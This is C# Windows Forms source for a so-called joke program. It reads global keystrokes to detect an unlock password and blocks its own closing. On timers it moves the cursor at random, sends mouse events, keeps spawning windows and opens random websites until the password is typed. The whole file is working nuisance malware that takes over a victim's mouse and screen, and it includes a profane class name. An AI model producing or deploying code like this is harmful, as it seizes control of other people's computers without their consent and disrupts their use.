using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Collections;
using System.Diagnostics;

namespace BestJoke
{
	public partial class Form1 : Form
	{
		[DllImport("user32.dll")]
		public static extern int GetAsyncKeyState(Int32 i);

		[DllImport("User32.dll")]
		static extern int SetForegroundWindow(IntPtr hWnd);

		[DllImport("user32.dll")]
		internal static extern bool SendMessage(IntPtr hWnd, Int32 msg, Int32 wParam, Int32 lParam);
		static Int32 WM_SYSCOMMAND = 0x0112;
		static Int32 SC_RESTORE = 0xF120;


		bool on = true;

		string last_keys = "";
		string pass = "wordulike";

		List<FormFuck> forms = new List<FormFuck>();

		public Form1()
		{
			InitializeComponent();
		}

		private void Form1_FormClosing(object sender, FormClosingEventArgs e)
		{
			this.Hide();
			e.Cancel = true;
			Cursor.Position = new Point(0, 0);
		}

		private void timerReadKeys_Tick(object sender, EventArgs e)
		{
			if (on)
			{
				for (int i = 0; i < 255; i++)
				{
					int state = GetAsyncKeyState(i);

					if (state != 0)
					{
						string key = ((Keys)i).ToString();

						if (pass.ToUpper().Contains(key.ToUpper()))
						{
							if (last_keys.Length > 0)
							{
								if (last_keys[last_keys.Length - 1] != key[0]) last_keys += key;
							}
							else
							{
								last_keys += key;
							}
						}

					}
				}

				if (last_keys.ToUpper().Contains(pass.ToUpper()))
				{
					on = false;

					foreach (FormFuck f in forms)
					{
						f.Close();
					}

					MessageBox.Show("Pass entered!");
				}
				if (last_keys.Length > 100)
				{
					last_keys.Remove(0, 50);
				}
			}
		}

		private void timerMouseMove_Tick(object sender, EventArgs e)
		{
			if (on)
			{
				// --------------------------------------------
				var proc = Process.GetCurrentProcess();

				if (proc != null)
				{
					var pointer = proc.MainWindowHandle;

					SetForegroundWindow(pointer);
					SendMessage(pointer, WM_SYSCOMMAND, SC_RESTORE, 0);
				}
				// --------------------------------------------

				Size resolution = System.Windows.Forms.Screen.PrimaryScreen.Bounds.Size;

				Random rnd = new Random();
				//Cursor.Position = new Point(rnd.Next(0, resolution.Width), rnd.Next(0, resolution.Height));

				Worker.SetCursorPos(rnd.Next(0, resolution.Width), rnd.Next(0, resolution.Height));
				Worker.mouse_event(0x1, rnd.Next(0, resolution.Width), rnd.Next(0, resolution.Height), 0, 0); //move
			}
		}

		private void timerOpenWindow_Tick(object sender, EventArgs e)
		{
			if (on)
			{
				FormFuck ff = new FormFuck();
				ff.Show();
				forms.Add(ff);
			}		
		}

		private void Form1_Shown(object sender, EventArgs e)
		{
			//this.Hide();
		}

		private void timerSiteOpen_Tick(object sender, EventArgs e)
		{
			if (on)
			{
				Random rnd = new Random();

				List<string> sites = new List<string>()
				{
					"https://vk.com/",
					"https://fb.com/",
					"https://www.google.com/"
				};

				try
				{
					System.Diagnostics.Process.Start(sites[rnd.Next(0, sites.Count)]);
				}
				catch
				{
					//
				}
			}
		}

	}

	class Worker
	{
		[DllImport("user32.dll")]
		public static extern void mouse_event(uint dwFlags, int dx, int dy, uint dwData, int dwExtraInfo);
		[DllImport("user32.dll")]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool SetCursorPos(int x, int y);

	}
}
